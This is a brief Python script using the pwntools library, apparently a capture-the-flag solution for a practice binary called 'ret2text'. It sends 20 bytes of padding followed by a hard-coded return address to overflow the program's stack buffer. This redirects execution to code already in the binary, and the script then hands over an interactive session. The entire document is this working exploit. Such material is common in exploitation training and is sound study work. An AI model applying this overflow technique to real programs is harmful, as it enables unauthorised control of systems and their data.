from pwn import *

returnAddress = 0x08048522

io = process('./ret2text')

payload = b'A'*20 + p32(returnAddress)

io.sendline(payload)

io.interactive()
